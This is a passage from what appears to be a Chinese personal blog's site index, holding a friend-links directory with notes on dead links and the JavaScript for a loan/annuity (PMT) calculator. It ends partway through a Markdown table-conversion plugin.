学习 && Share && 只是快乐的生活~ Mycpen&nbsp; blog.cpen.top 签名: 这是一个有趣的博客~ 小奏笔记 blog.mofuc.cn 签名: 技术分享与个人随笔札记 浅秋枫影的博客&nbsp; cuojue.org 签名: 给自己的网络生涯留下一笔精神财富！ 啊不都&nbsp; www.oplog.cn 签名: 这里是啊不都的博客~ 竹山一叶 zsyyblog.com 签名: 来了就不想走的小家 清北博客 blog.tsinbei.com 签名: 清北博客是清北科技官方开发者博客，致力于为广大技术爱好者提供优质技术教程。 周天记&nbsp; zhoutian.com 签名: 追求让人充实，分享让人快乐 XiaoPang的个人博客&nbsp; blog.xpdbk.com 签名: 一个什么都琢磨一下的博客 PeterJXL&nbsp; www.peterjxl.com 签名: 那就从零开始 Mikuの极光星 blog.sotkg.com 签名: 心有多宽，世界就有多远 Homulilly&nbsp; homulilly.com 签名: Aroes's Blog | \\萌脇舞以/ 玖涯博客&nbsp; blog.nineya.com 签名: 投资未来的人，是忠于现实的人。 青夜🎉の个人主页&nbsp; dh.qinye.cool 签名: 青夜的小小导航，里面有个人学习博客和自己的工具站。 铭心石刻&nbsp; blog.kouseki.cn 签名: 愿岁并谢，与友长兮 安仔の午睡床&nbsp; anzai.sleepingbed.top 签名: 啊对对对，开摆就完了呗~ 神经蛙&nbsp; hexo.sjava.cn 签名: 种一棵树最好的时间是十年前，其次是现在。 定の栈&nbsp; saop.cc 签名: LINK START! 绘星里&nbsp; blog.storia.ren 签名: 一起来绘制属于自己的星星！ 杀死一只知更鸟&nbsp; www.shangjidong.com 签名: 前端技术分享、前端学习记录 狼林鱼池&nbsp; blog.jiyu134.top 签名: 风带来了故事的种子，时间使之发芽 雨夜回廊 myql.eu.org 签名: 青天白日梦神仙 杜老师说&nbsp; dusays.com 貓工坊&nbsp; smilin.net 签名: Code · Thinking · ACG Leet&nbsp; leetme.netlify.app 签名: Out of my mind. 琅環书生&nbsp; blog.chn.us.kg 签名: 无远弗届，皆有可能 qxdn&nbsp; qianxu.run 签名: 蓬生麻中，不扶自直 lhDream blog.luhua.site 签名: 醉后不知天在水，满船清梦压星河。 米七独立技术 mi7.net 签名: 分享点有价值的 - 吳先森321 | 米七独立技术 微笑博客&nbsp; wxjxw.cn 签名: 知天易，易天难。 东东的小黑盒 www.ankia.top 签名: 生活未必似你所见 Calyee blog.calyee.top 签名: 追求充实，分享快乐 Pzai blog.pzai.cloud 签名: 从入门到放弃 养心殿 godky.cn ❖星港◎Star☆&nbsp; blog.starsharbor.com 签名: 以博客记录生活与热爱！ 小狐狸的被窝 sleepyfox-github.github.io 签名: (∪.∪ )…zzz 云灿の随笔小站&nbsp; blog.yuncan.xyz 签名: 浮云一别后，流水十年间 ZY知识库&nbsp; blog.pljzy.top 签名: 一个技术探索与分享的平台 清羽飞扬&nbsp; blog.liushen.fun 签名: 柳影曳曳，清酒孤灯，扬笔撒墨，心境如霜 伞菌の博客&nbsp; umb.ink 签名: 闲鱼的生活记录 一花&nbsp; www.dx3n.cn 签名: 💊繁花落尽一日看尽长安花🌸 纸鹿摸鱼处&nbsp; blog.zhilu.cyou 签名: 纸鹿至麓不知路，支炉制露不止漉 Elykia's Blog&nbsp; blog.elykia.cn 签名: 致以无暇之人 Z zxr's blog www.uuu.me.uk 签名: 一个初中生的博客 Rin的小破站&nbsp; www.darlingrin.com 签名: 一个热爱收集各种东西的菜鸡程序员 浅草物语&nbsp; www.chillg.de 签名: 繁杂互联网中的避风港，清静的一亩三分地。 Admibrill&nbsp; blog.qyadbr.top 签名: Where there is a will,there is a way. 萬事屋日记 yuazhi.cn 签名: 每天写下自己的喜好 GnixAij&nbsp; vluv.space 签名: vluv's space 学海无涯 clb.pages.dev 签名: 停止摆烂，背水一战 胡桃木实验室 www.htmacg.cn 签名: 一个神秘的小窝 RhoPaperの小站 blog.rhopaper.top 签名: 「 纸 至 执 」 绾秋小站 www.gx.gx.cn 签名: 用文字记录生活。 Liu Zijian's Blog&nbsp; blog.liuzijian.com 签名: 道阻且长，行则将至 TASA-Ed官网 www.tasaed.top 签名: TASA-Ed工作室官网 KASUIEの次元&nbsp; kasuie.cc 签名: 喜欢温柔的人 SeaEpoch&nbsp; www.seaepoch.com 签名: 她站在那里，就像一个小小的永恒！ RE Blog&nbsp; blog.randench.cn 签名: 施恩勿念，受恩莫忘。 顶茶社&nbsp; blog.redcha.cn 签名: 顶茶心 知识魂 张文保的博客&nbsp; zhangwenbao.com 签名: SEO顾问、高级SEO工程师 xyx404&nbsp; xyx404.github.io 签名: 在努力和摆烂中选择了努力摆烂AWA 清梦云熙&nbsp; skylan.cc 签名: 相逢何必曾相识 小明的部落格&nbsp; www.xmdblog.com 签名: 探索科技，启迪技能 Rimrose rimrose.top 签名: 生活在阴沟里，依然有仰望星空的权利 Peter267&nbsp; peter267.github.io 签名: 无限进步！ s1rius' blog&nbsp; s1rius.space 签名: 这里有网络安全和其他技术文章 JustPureH2O 的博客&nbsp; justpureh2o.cn 签名: 穷方圆平直之情 尽规矩准绳之用 Akvicor's Blog blog.akvicor.com 签名: 太棒了，我逐渐理解一切 iFluxArt iflux.art 签名: 斐启智境 · 流韵新生 Bleaz's Blog&nbsp; blog.bleaz.net 签名: 不畏过往，不惧将来 柠檬星 blog.lemonstar.me 签名: 天空就是一杯橘子味的柠檬汽水 青萍叙事&nbsp; blog.lusyoe.com 签名: 一个懂技术的产品汪🐶 清欲の小窝 blog.leoo.fun 签名: 沙雕网友清欲的碎碎念 Roxy_Magicの咖啡馆&nbsp; blog.roxymagic.top 签名: 昨日之书已合，今日之页当以“真本事”为墨 Honesty&nbsp; blog.hehouhui.cn 签名: 花有重开日，人无再少年 O's World&nbsp; ooo.run 签名: 探索互联网世界，分享实用教程与精彩内容，发现更多有趣之处。 NihaoShow nihao.show 签名: 一个人的网站 清遥&nbsp; blog.askrabbit.net 签名: 遥夜泛清瑟，西风生翠萝。 夏夜流萤&nbsp; blog.cuteleaf.cn 签名: 总有一场相遇，是互相喜欢的！ worable's Blog www.worable.top 签名: ≡ω≡ 嗯对，一名普通的职一牲~ yusuble特效&nbsp; blog.suble.cn 签名: 专注欧美影视的特效字幕的制作与分享。 Misaka Network&nbsp; blog.misaka-net.top 签名: 御坂网络 - 科学实验日志与技术观测站 Dark零点博客&nbsp; www.tenca.cn min的小窝&nbsp; flyblog.qzz.io 签名: 技术分享，生活记录 G.B.S.A.T.'s Official Blog blog.gbsat.org 签名: G.B.S.A.T. 的官方公开博客，我们将在此发布很多有用资讯或教程，亦或是分享实用的软件资源，欢迎关注我们！ 绯鞠的博客&nbsp; loli.fj.cn 签名: 一只爱折腾的绯鞠 异常友链 | 如存在异议请在评论区留言 T Trainoo&nbsp;无法访问 trainoo.gitee.io 签名: A simple man living a simple life备注: 2024/06/17 无法访问 M MSpace&nbsp;无法访问 jschenliang.gitee.io 签名: 不念过去，不畏将来！备注: 2024/06/17 无法访问 梦 梦无念&nbsp;无法访问 nodream.work 签名: 悠闲自由的小站备注: 2024/06/17 无法访问 北 北梦的个人博客&nbsp;无法访问 www.furacas.com 签名: 交流、分享、成长备注: 2024/06/17 无法访问 R rainend&nbsp;无法访问 rainend.me 签名: 月落星不沉备注: 2024/06/17 无法访问 怕 怕冷爱上雪&nbsp;无法访问 blog.4t.pw 签名: 千里之行，始于足下。备注: 2024/06/17 无法访问 玖 玖久的小窝&nbsp;无法访问 blog.zhuxu.xyz 签名: 有钱终成眷属，没钱亲眼目睹备注: 2024/06/17 无法访问 王 王卓Sco&nbsp;无法访问 blog.wzsco.cn 签名: 宁静致远，热爱生活。备注: 2024/06/17 无法访问 C ClimbingMouse&nbsp;无法访问 blog.climbingmouse.top 签名: 纵有疾风起，人生不言弃备注: 2024/06/17 无法访问 G Gahotx&nbsp;无法访问 gahotx.cn 签名: Don't repeat yourself备注: 2024/06/17 无法访问 柠 柠檬大师的空间站&nbsp;无法访问 leidl.top 签名: 一个不善言辞的Java攻城狮备注: 2024/06/17 证书过期 南 南下客&nbsp;无法访问 www.nanxiake.vip 签名: 南下客的个人网站，期待与更多的人相遇！备注: 2024/06/17 证书过期 X xiaoger&nbsp;无法访问 xiaoger.top 签名: 个人学习和分享壁纸的博客备注: 2024/06/17 证书过期 C ChenYu-K's Blog&nbsp;无法访问 chenyu-k.com 签名: Memento Mori备注: 2024/08/15 无法访问 心 心念个人博客&nbsp;无法访问 www.hyl999.co 签名: 犹一心一意 , 念念不忘备注: 2024/10/24 无法访问 Q Qing&nbsp;无法访问 blog.wuyuxi.cn 签名: 你侬我侬，忒煞情多备注: 2024/10/24 无法访问 X Xdogの小岛&nbsp;无法访问 blog.xdog.run 签名: 结束即是开始备注: 2024/10/24 无法访问 李 李程ic&nbsp;无法访问 www.licic.net 签名: 中华人民共和国万岁！备注: 2024/10/24 证书过期 S Slcpの童话镇&nbsp;无法访问 www.slcp.top 签名: 你若盛开,阳光自来。备注: 2024/10/29 无法访问 E Eacls&nbsp;无法访问 www.eacls.top 签名: 看一看世界的繁华备注: 2025/01/14 无法访问 九 九九小筑&nbsp;无法访问 www.lujiujiu.site 签名: 满地都是六便士，他却想抬头看见了月亮。备注: 2025/01/14 证书过期 D DragonJay&nbsp;无法访问 blog.dragonjay.top 签名: My web3 blog备注: 2025/05/09 无法访问 L lizilong的部落格&nbsp;无法访问 lizilong1993.github.io 签名: 进一步有进一步的欢喜备注: 2025/05/09 无法访问 S Somesite&nbsp;无法访问 blog.kicey.site 签名: Coding, rescue my life.备注: 2025/05/09 无法访问 你 你瞅啥&nbsp;无法访问 www.ncs.fun 签名: 当学习成为消遣！备注: 2026/02/04 无法访问（500） 3 365云栈&nbsp;无法访问 blog.365sites.top 签名: 初阅不明言外意，重温方觉字中情备注: 2026/02/04 无法访问（502） 忘 忘忧草の小破站&nbsp;无法访问 owo.wyc.rest 签名: 这只是一个小破站而已！备注: 2026/02/04 无法访问（连接超时） 浅 浅小兮の梦&nbsp;无法访问 zxwlove.xyz 签名: 从相遇的刹那开始就注定了别离！备注: 2026/02/04 无法访问（连接超时） M MJ's Blog&nbsp;无法访问 blog.justlovesmile.top 签名: 醒亦念卿，梦亦念卿备注: 2026/02/04 无法访问（连接关闭） 调 调皮豆干&nbsp;无法访问 blog.catrol.cn 签名: 就在这里发电备注: 2026/02/04 无法访问（连接关闭） M MoyuqLのBlog&nbsp;无法访问 blog.moyuql.top 签名: MoyuqL与你同在~备注: 2026/02/04 无法访问（连接关闭） K Kegongteng&nbsp;无法访问 kegongteng.cn 签名: Blogger / Technophile / Student备注: 2026/02/04 无法访问（连接关闭） 時 時光&nbsp;无法访问 blog.shiguangdev.cn 签名: 心寄朗朗乾坤，胸怀真修之道。备注: 2026/02/04 无法访问（连接关闭） T Tannerの笔记&nbsp;无法访问 sbsb.life 签名: 坚持记录！备注: 2026/02/04 无法访问（连接关闭） B btwoa&nbsp;无法访问 blog.btwoa.com 备注: 2026/02/04 无法访问（证书过期） 小 小杨博客&nbsp;无法访问 xycs1.xyz 签名: 佛系也是一种人生不是吗备注: 2026/02/04 无法访问（证书过期） 若 若离风的博客&nbsp;单向友链 www.rlfit.cn 签名: 简单的技术博客备注: 2024/06/17 无故删除本站友链 棋 棋の小站&nbsp;单向友链 imqi1.com 签名: 记录Python学习，分享技术和生活。备注: 2024/06/17 无故删除本站友链 寒 寒烟志&nbsp;单向友链 yanyuplus.cn 签名: 半山腰总是挤的，你得去山顶看看备注: 2024/10/24 无故删除本站友链 木 木子李 Blog&nbsp;单向友链 www.muziliblog.com 签名: 木子李 Blog备注: 2024/10/24 无故删除本站友链 星 星の野&nbsp;单向友链 byer.top 签名: 我自是年少，韶华倾负备注: 2025/01/14 友链页无法正常打开 江 江城时光&nbsp;单向友链 www.zerosper.com 签名: 人生如逆旅，我亦是行人备注: 2025/01/14 找不到友链页 陈 陈鑫磊的博客&nbsp;单向友链 www.cxl2020mc.top 签名: 这个人太懒了啥也没写......备注: 2025/05/09 博客关闭 小 小N同学&nbsp;单向友链 www.imcharon.com 签名: 青石落晚巷 故人未还乡备注: 2026/02/04 单向友链 Y Yeppioo.&nbsp;单向友链 blog.yeppioo.vip 签名: 梦想成为庄稼地里的读书人.....备注: 2026/02/04 无故删除本站友链 友情链接申请如贵站符合以下条件，并希望交换友情链接，敬请在评论区留言。 ✅ 贵站为个人博客类网站；✅ 贵站在中国大陆区域能够正常访问；✅ 贵站符合中国大陆法律法规；✅ 贵站已添加本站友情链接。 本站友链信息如下： 网站名称：iMaeGoo’s Blog网站地址：https://www.imaegoo.com网站图标：https://cdn.jsdelivr.net/npm/imaegoo/avatar.jpg网站简介：虹墨空间站","link":"/friends/"},{"title":"友链朋友圈","text":"友链朋友圈由 Inoreader 驱动 新标签页打开 下载 OPML 订阅文件 如果贵站在本站的友情链接列表中，但未出现在友链朋友圈，请检查： 贵站已支持 RSS 订阅，并且 RSS 链接已放在首页 贵站近期发表过新文章 如果您仍有疑问，敬请留言。","link":"/moments/"},{"title":"","text":"function PMT() {} PMT.prototype.pmt = function (rate, nper, pv, fv, type) { if (!fv) fv = 0; if (!type) type = 0; if (rate == 0) return -(pv + fv) / nper; var pow = Math.pow(1 + rate, nper); var pmt = (rate / (pow - 1)) * -(pv * pow + fv); if (type == 1) { pmt /= 1 + rate; } return pmt.toFixed(4); }; PMT.prototype.nper = function nper(rate, pv, fv, pmt, type) { if (!fv) fv = 0; if (!type) type = 0; if (rate == 0) return -(pv + fv) / pmt; if (type === 1) { pmt = (1 + rate) * pmt; } var nper = Math.log((pmt - rate * fv) / (pmt + rate * pv)) / Math.log(1 + rate); // 计算器中如需求\"期数\"的，其计算结果向上取整。例如，如计算结果为10.0001（年），10.5（年）,10.95（年）等情况的，都近似为11（年）。 return Math.ceil(nper); }; PMT.prototype.pv = function pv(rate, nper, fv, pmt, type) { if (!fv) fv = 0; if (!type) type = 0; if (rate === 0) return -pmt * nper - fv; if (type === 1) { pmt = (1 + rate) * pmt; } var pow = Math.pow(1 + rate, nper); var pv = ((-pmt * (pow - 1)) / rate - fv) / pow; return pv.toFixed(4); }; PMT.prototype.fv = function fv(rate, nper, pv, pmt, type) { if (!type) type = 0; if (rate === 0) return -pmt * nper - pv; if (type === 1) { pmt = (1 + rate) * pmt; } var pow = Math.pow(1 + rate, nper); var fv = (-pmt * (pow - 1)) / rate - pv * pow; return fv.toFixed(4); }; var query = function (selector) { return document.querySelector(selector); }; var queryAll = function (selector) { return document.querySelectorAll(selector); }; function disableParam() { query('[name=\"param\"]:not(:checked)').disabled = true; } function setInputFilter(textbox, inputFilter) { [ \"input\", \"keydown\", \"keyup\", \"mousedown\", \"mouseup\", \"select\", \"contextmenu\", \"drop\", ].forEach(function (event) { textbox.addEventListener(event, function () { if (inputFilter(this.value)) { this.oldValue = this.value; this.oldSelectionStart = this.selectionStart; this.oldSelectionEnd = this.selectionEnd; } else if (this.hasOwnProperty(\"oldValue\")) { this.value = this.oldValue; this.setSelectionRange(this.oldSelectionStart, this.oldSelectionEnd); } else { this.value = \"\"; } }); }); } var pmtCalculator = new PMT(); var params = [\"nper\", \"pv\", \"fv\", \"pmt\"]; var todo = []; function calculate() { var checkedParams = queryAll('[name=\"param\"]:checked'); if (checkedParams.length !== 3) return; var typeElem = query('[name=\"type\"]:checked'); if (!typeElem) return; var rate = Number(query('[name=\"rate\"]').value) / 100; var type = Number(typeElem.value); var paramsKey = [], paramsValue = []; /*checkedParams.forEach(function (element) { paramsKey.push(element.value); paramsValue.push(Number(query(`[name=\"${element.value}\"]`).value)); });*/ let hasEmptyParam = false; checkedParams.forEach(function (element) { const elementDom = query(`[name=\"${element.value}\"]`); elementDom.classList.remove(\"invalid-tip\"); const pVal = elementDom.value; // 如果没有输入数值，给出提示 if (pVal === \"\") { hasEmptyParam = true; elementDom.classList.add(\"invalid-tip\"); } // 如果利率没有填写 const rateDom = query('[name=\"rate\"]'); if(rateDom.value === \"\") { hasEmptyParam = true; rateDom.classList.add(\"invalid-tip\"); } paramsKey.push(element.value); paramsValue.push(Number(pVal)); }); if(hasEmptyParam){ return; } for (var i = 0; i < params.length; i++) { var param = params[i]; // 确定计算项 if (paramsKey.indexOf(params[i]) === -1) { var result = pmtCalculator[param]( rate, paramsValue[0], paramsValue[1], paramsValue[2], type ); // var result = pmtCalculator[param](...[rate, ...paramsValue, type]); query(\".result\").innerHTML = result; query(\".result\").style.color = \"#333\"; break; } } } function clearResult() { window.location.reload(); /*var inputParams = queryAll('input.input-param'); for(let i = 0, len = inputParams.length; i < len; i++) { inputParams[i].value = ''; } */ } window.onload = function () { document.getElementById(\"calculate\").addEventListener(\"click\", calculate); document.getElementById(\"\bclear-result\").addEventListener(\"click\", clearResult); // input-paramt focus remove invalid tip var inputParams = queryAll('input.input-param'); var params = queryAll('input[name=param]'); for(let i = 0, len = params.length; i < len; i++) { params[i].addEventListener('click', function() { const inputPara = document.querySelector('input.input-param[name=' + params[i].id + ']') inputPara.classList.remove('invalid-tip'); }) } for(let i = 0, len = inputParams.length; i < len; i++) { const inputEle = inputParams[i]; inputEle.addEventListener('focus', function() { inputEle.classList.remove('invalid-tip'); }) inputEle.nextElementSibling.addEventListener('click', function() { inputEle.classList.remove('invalid-tip'); }) } // 设置输入输出项 // 期数、现值、终值、每期付款额, 可勾选其中任意三项值 Array.prototype.forEach.call(queryAll('[name=\"param\"]'), function (ele) { ele.addEventListener(\"click\", function (e) { var checkedParam = this.value; var input = query(`[name=\"${checkedParam}\"`); if (this.checked) { todo.push(checkedParam); input.disabled = false; if (todo.length === 3) { query('[name=\"param\"]:not(:checked)').disabled = true; } } else { var index = todo.indexOf(checkedParam); todo.splice(index, 1); input.disabled = true; input.value = ''; if (todo.length === 2) { query('[name=\"param\"]:disabled').disabled = false; query(\".result\").style.color = \"#9e9e9e\"; } } }); }); // input filters Array.prototype.forEach.call(queryAll(\".input-param\"), function (ele) { setInputFilter(ele, function (value) { return /^-?\\d*\\.?\\d*$/.test(value); // Allow digits and '.' only, using a RegExp }); ele.addEventListener(\"blur\", function () { if ([\".\", \"-\", \"-.\"].indexOf(this.value) > -1) { this.value = ''; } }); }); // input calculator const closeBtns = document.querySelectorAll(\".close\"); for (let i = 0, len = closeBtns.length; i < len; i++) { const closeBtn = closeBtns[i]; closeBtn.removeEventListener(\"click\", __postMsg); closeBtn.addEventListener(\"click\", __postMsg); } function __postMsg() { window.parent.postMessage(\"close\", \"*\"); } // TODO: sqrt, %, 1/x, +/- // 4+5+sqrt // 4+5+/- (function () { \"use strict\"; // result var result; // current number var currNum; // prev result var prevResult; // history var history; // prev btn pressed var prevBtn; // math operation var mathOp; // prev math operation var prevMathOp; // math operation counter var mathOpCount; // math op pressed? var mathOpPress; // init var isInit; // main screen var mainScreen; // history screen var historyScreen = document.querySelector(\"#history\"); // 显示小键盘 var subCalc = query(\".sub-calc\"); Array.prototype.forEach.call(queryAll(\".mini-calc\"), function (ele) { ele.addEventListener(\"click\", function (e) { e.stopPropagation(); if (ele.previousElementSibling.disabled) return; mainScreen = ele.previousElementSibling; init({ currNum: mainScreen.value, prevBtn: mainScreen.value, history: mainScreen.value === \"0\" ? \"\" : mainScreen.value, }); subCalc.style.display = \"inline-block\"; subCalc.style.position = \"absolute\"; subCalc.style.left = ele.offsetLeft - subCalc.offsetWidth + \"px\"; subCalc.style.top = ele.offsetTop + 20 + \"px\"; mainScreen.classList.add(\"focused\"); }); }); query(\".pmt-calculator\").addEventListener(\"click\", function (e) { subCalc.style.display = \"none\"; Array.prototype.forEach.call(queryAll(\".input-param\"), function (ele) { ele.classList.remove(\"focused\"); }); }); query(\".sub-calc\").addEventListener(\"click\", function (e) { e.stopPropagation(); }); // attach click events to buttons Array.prototype.forEach.call(subCalc.querySelectorAll(\".button\"), function ( btn ) { btn.addEventListener(\"click\", function (e) { var btnClicked = e.currentTarget.getAttribute(\"data-value\"); input(btnClicked); }); }); // initialize function init(param) { result = null; currNum = param.currNum; prevBtn = param.prevBtn; mathOp = null; prevMathOp = null; mathOpCount = 0; history = param.history; mathOpPress = false; isInit = true; // updateMainScreen(0); // updateHistoryScreen(history); } function input(btn) { // copy prev math op if ( !isNaN(prevBtn) && btn !== \"=\" && btn !== \"C\" && btn !== \"CS\" && btn !== \".\" ) { prevMathOp = mathOp; } switch (btn) { case \"+\": mathOpPress = true; mathOp = addition; break; case \"-\": mathOpPress = true; mathOp = subtraction; break; case \"/\": mathOpPress = true; mathOp = division; break; case \"*\": mathOpPress = true; mathOp = multiplication; break; case \"C\": init({ currNum: \"0\", prevBtn: null, history: \"\", }); updateMainScreen(0); break; } handler(btn); // console.log(\"Result: \" + result); // console.log(\"Prev result: \" + prevResult); // console.log(\"current number: \" + currNum); // console.log(\"btn: \" + btn); // console.log(\"Prev Math Op: \" + prevMathOp); // console.log('Math Op: ' + mathOp); // console.log(\"Math Op Counter: \" + mathOpCount); // console.log(\"Prev btn: \" + prevBtn); // console.log(\"History: \" + history); // console.log(\"Main Screen \" + mainScreen.value); // console.log('Math Op Press: ' + mathOpPress); // console.log(\"*\".repeat(15)); } // mathOpPress = true; // mathOp = addition; // 4 + 5 + function handler(btn) { // return if C wasn't pressed when divide by zero was done if ( (btn !== \"C\" && result === \"Result is undefined\") || result === \"Cannot divide by zero\" ) { return; } // update history if (btn !== \"=\" && btn !== \"C\" && btn !== \"CS\") { history = isNaN(prevBtn) && isNaN(btn) ? history.slice(0, -1) + btn : history + btn; } // btn clicked is `Number` or `.` if (!isNaN(btn) || btn === \".\") { if (btn === \".\" && /^\\d+$/.test(currNum)) { currNum = currNum + btn; } else if (!isNaN(btn)) { if (prevBtn === \"=\") result = null; // 4 + // 4 + 4 + currNum = (!isNaN(prevBtn) && prevBtn !== null && mainScreen.value !== \"0\") || prevBtn === \".\" ? currNum + btn : btn; } mathOpPress = false; updateMainScreen(currNum); // btn clicked is `Sign` } else { // update history if (btn === \"-\" || btn === \"+\" || btn === \"*\" || btn === \"/\") { // for example, when `-` is pressed, add `0 -` to history screen if ((prevBtn === null || prevBtn === \"=\") && !isInit) { history = \"0\" + btn; mathOpCount++; } if (!historyScreen.value.length && mainScreen.value.length) { history = mainScreen.value + btn; } // current value // mainScreen.value = '' } // if math op was pressed and result is null if (mathOp && result === null) { result = Number(currNum); } // count percents if (btn === \"%\") { history = history.slice(0, -(currNum.length + 1)); currNum = percentage(currNum); history += currNum + \" \"; updateMainScreen(currNum); // count square or square root } else if (btn === \"sqrt\" || btn === \"1/x\" || btn === \"+/-\") { // btn: +, prevbtn: 9 // if (isNaN(prevBtn)) { // // btn = mainScreen.value; // prevBtn = mainScreen.value; // prevMathOp = addition; // currNum = mainScreen.value; // history = '9+9'; // } history = history.slice(0, -(currNum.length + btn.length)) + (btn === \"1/x\" ? \"1/(\" + currNum + \") \" : btn === \"+/-\" ? \"-1*(\" + currNum + \") \" : btn + \"(\" + currNum + \") \"); // sqrt currNum = btn === \"sqrt\" ? squareRoot(mainScreen.value) : btn === \"1/x\" ? fraction(mainScreen.value) : negative(mainScreen.value); updateMainScreen(currNum); updateHistoryScreen(history); } // 4 + 5 + => 9 sqrt // count result if (btn === \"=\") { // if math op exists if (mathOp) { mathOpCount = 0; if (mathOpPress) { // if last button pressed is `mathOperation` // like `+, - etc.` before `=` was pressed // mathOp(prevResult); mathOp(currNum); } else { // if last button pressed is `digit` before `=` was pressed mathOp(Number(currNum)); } history = \"\"; prevBtn = btn; updateMainScreen(result); updateHistoryScreen(history); return; } } // count math ops // if sign was pressed and prev btn isn't sign and except some buttons if ( isNaN(btn) && (!isNaN(prevBtn) || prevBtn === \"%\" || prevBtn === \"sqrt\" || prevBtn === \"1/x\") && btn !== \"=\" && btn !== \"C\" && btn !== \"CS\" && btn !== \".\" && btn !== \"%\" && btn !== \"sqrt\" && btn !== \"1/x\" ) { mathOpCount++; } // count result in row if ( mathOpCount >= 2 && (!isNaN(prevBtn) || prevBtn === \"sqrt\" || prevBtn === \"sqr\" || prevBtn === \"1/x\" || prevBtn === \"%\") && btn !== \"CS\" ) { prevMathOp(Number(currNum)); // result // new prevResult = result; currNum = result; // history history = result + btn; mathOpCount = 1; // new updateMainScreen(result); } if (btn === \"CS\") { if ( result != mainScreen.value && [\"sqrt\", \"%\", \"1/x\", \"+/-\"].indexOf(prevBtn) === -1 ) { currNum = currNum.slice(0, -1); history = history.slice(0, -1); if (!currNum.length) { currNum = \"0\"; } updateMainScreen(currNum); } else { return; } } if (result !== null && btn !== \"CS\") { updateHistoryScreen(history); } } prevBtn = btn; prevResult = result; isInit = false; } function updateMainScreen(val) { val = String(val); mainScreen.value = val; } function updateHistoryScreen(history) { historyScreen.value = history; } function addition(val) { result = Number(new BigNumber(result).plus(val).toFixed(4)); } function subtraction(val) { result = Number(new BigNumber(result).minus(val).toFixed(4)); } function division(val) { result = Number(new BigNumber(result).dividedBy(val).toFixed(4)); } function multiplication(val) { result = Number(new BigNumber(result).times(val).toFixed(4)); } // sqrt function squareRoot(val) { return Number(new BigNumber(val).sqrt().toFixed(4)); } // % function percentage(val) { return Number(new BigNumber(val).dividedBy(100).toFixed(4)); } // 1/x function fraction(val) { return Number(new BigNumber(1).dividedBy(val).toFixed(4)); } // +/- function negative(val) { return -1 * val; } })(); };","link":"/js/imaegoo/finance-cal.js"},{"title":"","text":"var TurndownPluginGfmService = (function (exports) { 'use strict'; var highlightRegExp = /highlight-(?:text|source)-([a-z0-9]+)/; function highlightedCodeBlock (turndownService) { turndownService.addRule('highlightedCodeBlock', { filter: function (node) { var firstChild = node.firstChild; return ( node.nodeName === 'DIV' && highlightRegExp.test(node.className) && firstChild && firstChild.nodeName === 'PRE' ) }, replacement: function (content, node, options) { var className = node.className || ''; var language = (className.match(highlightRegExp) || [null, ''])[1]; return ( '\\n\\n' + options.fence + language + '\\n' + node.firstChild.textContent + '\\n' + options.fence + '\\n\\n' ) } }); } function strikethrough (turndownService) { turndownService.addRule('strikethrough', { filter: ['del', 's', 'strike'], replacement: function (content) { return '~' + content + '~' } }); } var indexOf = Array.prototype.indexOf; var rules = {}; rules.tableCell = { filter: ['th', 'td'], replacement: function (content, node) { return cell(content, node) + spannedCells(node, '') } }; rules.tableRow = { filter: 'tr', replacement: function (content, node) { var borderCells = ''; var alignMap = { left: ':--', right: '--:', center: ':-:' }; if (isHeadingRow(node)) { for (var i = 0; i < node.childNodes.length; i++) { var border = '---'; var align = ( node.childNodes[i].getAttribute('align') || '' ).toLowerCase(); if (align) border = alignMap[align] || border; borderCells += cell(border, node.childNodes[i]) + spannedCells(node.childNodes[i], border); } } return '\\n' + content + (borderCells ? '\\n' + borderCells : '') } }; rules.table = { // Only convert tables that are not nested in another table, they are kept using `keep` (see below). // TODO: nested tables should be converted to plain text in a strict (non HTML) gfm filter: function (node) { return node.nodeName === 'TABLE' && !isNestedTable(node) }, replacement: function (content, node) { // If table has no heading, add an empty one so as to get a valid Markdown table var firstRow = node.rows.length ? node.rows[0] : null; var columnCount = firstRow ? firstRow.childNodes.length : 0; var emptyHeader = ''; if (columnCount && !isHeadingRow(firstRow)) { emptyHeader = '|' + ' |'.repeat(columnCount) + '\\n' + '|' + ' --- |'.repeat(columnCount); } // Ensure there are no blank lines content = content.replace('\\n\\n', '\\n'); return '\\n\\n' + emptyHeader + content + '\\n\\n' } }; rules.tableSection = { filter: ['thead', 'tbody', 'tfoot'], replacement: function (content) { return content } }; rules.captionSection = { // only return content if caption if the first node immediately after TABLE filter: 'caption', replacement: function (content, node) { if (node.parentNode.nodeName === 'TABLE' && node.parentNode.childNodes[0] === node) return content return '' } }; function isHeadingRow (tr) { var parentNode = tr.parentNode; var tableNode = parentNode; if (parentNode.nodeName === 'THEAD' || parentNode.nodeName === 'TFOOT' || parentNode.nodeName === 'TBODY') { tableNode = parentNode.parentNode; } return (tableNode.nodeName === 'TABLE' && tableNode.rows[0] === tr) } function cell (content, node) { var index = indexOf.call(node.parentNode.childNodes, node); var prefix = ' '; if (index === 0) prefix = '| '; // Ensure single line per cell (both windows and unix EoL) // TODO: allow gfm non-strict mode to replace new lines by `` content = content.replace(/\\r\\n/g, '\\n').replace(/\\n/g, ' '); // | must be escaped as \\| content = content.replace(/\\|/g, '\\\\|'); return prefix + content + ' |' } function spannedCells (node, spannedCellContent) { var colspan = node.getAttribute('colspan') || 1; if (colspan","link":"/js/imaegoo/turndown-plugin-gfm.js"}]}